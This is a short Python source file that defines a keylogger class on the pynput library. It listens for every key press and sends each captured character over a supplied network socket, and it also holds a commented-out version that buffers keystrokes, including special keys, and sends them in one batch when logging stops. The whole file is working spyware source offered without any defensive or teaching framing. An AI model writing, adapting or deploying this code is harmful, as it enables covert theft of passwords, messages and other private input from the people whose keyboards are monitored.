from pynput import keyboard

class Keylogger:
    def __init__(self, client_socket):
        self.key = None
        self.listener = None
        self.conn = client_socket
    
    def start(self):
        # create keyboard listener
        self.listener = keyboard.Listener(on_press=self.log)

        # start the keyboard listener
        self.listener.start()

        # wait for user input
        input()

    def log(self, key):
        # send char over socklet to client
        self.conn.send(str(key.char).encode())

    # remove listeners and close connection
    def stop(self):
        self.listener.stop()
        self.listener = None
        self.conn.close()


# from pynput import keyboard

# class Keylogger:
#     def __init__(self, client_socket):
#         self.conn = client_socket
#         self.listener = None
#         self.logging = False
#         self.keys = []

#     def start(self):
#         self.listener = keyboard.Listener(on_press=self.on_key_press)
#         self.logging = True
#         self.keys = []
#         self.listener.start()

#     def on_key_press(self, key):
#         try:
#             char = key.char
#         except AttributeError:
#             if key == keyboard.Key.esc:
#                 self.stop()
#                 return
#             char = f'[{str(key)}]'

#         self.keys.append(char)

#     def stop(self):
#         if self.logging:
#             self.listener.stop()
#             self.logging = False
#             self.conn.send("".join(self.keys).encode())

#     def is_logging(self):
#         return self.logging
